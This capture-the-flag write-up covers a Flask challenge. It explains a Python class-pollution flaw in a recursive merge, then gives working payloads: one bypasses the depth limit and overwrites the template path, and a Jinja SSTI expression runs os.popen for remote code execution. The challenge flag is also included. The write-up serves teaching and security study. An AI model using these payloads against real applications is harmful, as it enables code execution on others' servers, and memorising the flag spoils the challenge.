# Personal Website

## Description

I made a customizable website (TODO: add more options)

## Writeup


### Solution 1

The vulnerability lies in the following code:

```python
def merge_info(src, user, *, depth=0):
    if depth > 3:
        raise Exception("Reached maximum depth")
    for k, v in src.items():
        if hasattr(user, "__getitem__"):
            if user.get(k) and type(v) == dict:
                User.merge_info(v, user.get(k), depth=depth+1)
            else:
                user[k] = v
        elif hasattr(user, k) and type(v) == dict:
            User.merge_info(v, getattr(user, k), depth=depth+1)
        else:
            setattr(user, k, v)
```

Such recursive merges make it possible to perform Python [Class Pollution](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.html).
This attack allows you, for example, to change class metadata:

```python
obj.__class__.__qualname__ = "foobar"
```

or to modify global variables:

```python
obj.__class__.__init__.__globals__["GLOBAL_VAR"] = "bizbaz"
```

However, because of the recursion depth limit, the attack is quite restricted. To bypass this, you can overwrite the default value of the depth parameter:

```python
user.__class__.merge_info.__kwdefaults__["depth"] = -9999
```

This effectively disables the depth restriction.

At this point, you can freely modify global variables. In `app.py`, the global variables can be accessed like this:

```python
user.__class__.__init__.__globals__["generate_password_hash"].__globals__["os"].sys.modules["app"].CONFIG_TEMPLATE
```

This makes it possible to overwrite the template path. We cannot reference files outside `/app` directory. Fortunately, inside the `/app` directory, a `flask.log` log file is generated. If you can inject a Flask SSTI payload into this file, you can achieve RCE.

By setting the template path to an SSTI payload, you can trigger an error such as:

```
jinja2.exceptions.TemplateNotFound: {{[].__class__.__class__.__subclasses__([].__class__.__class__)[0].register.__builtins__['__import__']('os').popen('/readflag').read()}}
```

which can then be leveraged for code execution.

### Solution 2

The depth restriction bypass is the same as in Solution 1. Given that Class Pollution is possible, [Jinja provides gadgets that lead directly to arbitrary code execution](https://www.offensiveweb.com/docs/programming/python/class-pollution/#rce). Therefore, the challenge can also be solved simply by reusing such gadgets.

## Flag

`fwectf{__m3R6e_H4_MAj1_Kik3N__<dynamic>}`
